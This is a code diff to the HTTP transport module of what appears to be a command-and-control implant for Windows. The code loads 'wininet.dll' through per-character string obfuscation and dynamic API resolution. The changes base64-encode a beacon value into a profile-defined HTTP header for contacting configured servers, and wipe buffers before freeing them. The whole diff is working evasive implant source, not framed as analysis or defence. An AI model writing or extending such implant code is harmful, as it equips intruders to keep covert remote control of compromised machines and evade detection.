@@ -1,8 +1,8 @@
 #include "ConnectorHTTP.h"
-#include "utils.h"
 #include "ApiLoader.h"
 #include "ApiDefines.h"
 #include "ProcLoader.h"
+#include "Encoders.h"
 
 BOOL _isdigest(char c)
 {
@@ -34,6 +34,14 @@ int _atoi(const char* str)
 	return result * sign;
 }
 
+DWORD _strlen(CHAR* str)
+{
+	int i = 0;
+	if (str != NULL)
+		for (; str[i]; i++);
+	return i;
+}
+
 ConnectorHTTP::ConnectorHTTP()
 {
 	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
@@ -45,16 +53,16 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions->GetLastError = ApiWin->GetLastError;
 
 	CHAR wininet_c[12];
-	wininet_c[0] = HdChrA('w');
-	wininet_c[1] = HdChrA('i');
-	wininet_c[2] = HdChrA('n');
-	wininet_c[3] = HdChrA('i');
-	wininet_c[4] = HdChrA('n');
-	wininet_c[5] = HdChrA('e');
-	wininet_c[6] = HdChrA('t');
-	wininet_c[7] = HdChrA('.');
-	wininet_c[8] = HdChrA('d');
-	wininet_c[9] = HdChrA('l');
+	wininet_c[0]  = HdChrA('w');
+	wininet_c[1]  = HdChrA('i');
+	wininet_c[2]  = HdChrA('n');
+	wininet_c[3]  = HdChrA('i');
+	wininet_c[4]  = HdChrA('n');
+	wininet_c[5]  = HdChrA('e');
+	wininet_c[6]  = HdChrA('t');
+	wininet_c[7]  = HdChrA('.');
+	wininet_c[8]  = HdChrA('d');
+	wininet_c[9]  = HdChrA('l');
 	wininet_c[10] = HdChrA('l');
 	wininet_c[11] = HdChrA(0);
 
@@ -73,24 +81,30 @@ ConnectorHTTP::ConnectorHTTP()
 	}
 }
 
-void ConnectorHTTP::SetConfig(ProfileHTTP profile, CHAR* beat)
+BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 {
-	ULONG beat_length = StrLenA(beat);
-	ULONG param_length = StrLenA((CHAR*) profile.parameter);
-	ULONG headers_length = StrLenA((CHAR*) profile.http_headers);
+	LPSTR encBeat = b64_encode(beat, beatSize);
 
-	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(param_length + beat_length + headers_length + 5);
+	ULONG enc_beat_length = _strlen(encBeat);
+	ULONG param_length    = _strlen((CHAR*) profile.parameter);
+	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);
+
+	CHAR* HttpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, profile.parameter, param_length);
 	index += param_length;
 	HttpHeaders[index++] = ':';
 	HttpHeaders[index++] = ' ';
-	memcpy(HttpHeaders + index, beat, beat_length);
-	index += beat_length;
+	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
+	index += enc_beat_length;
 	HttpHeaders[index++] = '\r';
 	HttpHeaders[index++] = '\n';
 	HttpHeaders[index++] = 0;
+
+	memset(encBeat, 0, enc_beat_length);
+	this->functions->LocalFree(encBeat);
+	encBeat = NULL;
 
 	this->headers        = HttpHeaders;
 	this->server_count   = profile.servers_count;
@@ -102,6 +116,8 @@ void ConnectorHTTP::SetConfig(ProfileHTTP profile, CHAR* beat)
 	this->user_agent     = (CHAR*) profile.user_agent;
 	this->ans_size		 = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
+
+	return TRUE;
 }
 
 void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
@@ -144,7 +160,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						}
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)StrLenA(headers), (LPVOID)data, (DWORD)data_size);
+					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
 					if (connected) {
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
@@ -241,7 +257,7 @@ BYTE* ConnectorHTTP::RecvData()
 		return NULL;
 }
 
-ULONG ConnectorHTTP::RecvSize()
+DWORD ConnectorHTTP::RecvSize()
 {
 	if (this->recvSize < this->ans_size)
 		return 0;
@@ -251,8 +267,11 @@ ULONG ConnectorHTTP::RecvSize()
 
 void ConnectorHTTP::RecvClear()
 {
-	if(this->recvData && this->recvSize)
-		MemFreeLocal((LPVOID*)& this->recvData, this->recvSize);
+	if (this->recvData && this->recvSize) {
+		memset(this->recvData, 0, this->recvSize);
+		this->functions->LocalFree(this->recvData);
+		this->recvData = NULL;
+	}
 }
 
 void ConnectorHTTP::CloseConnector()
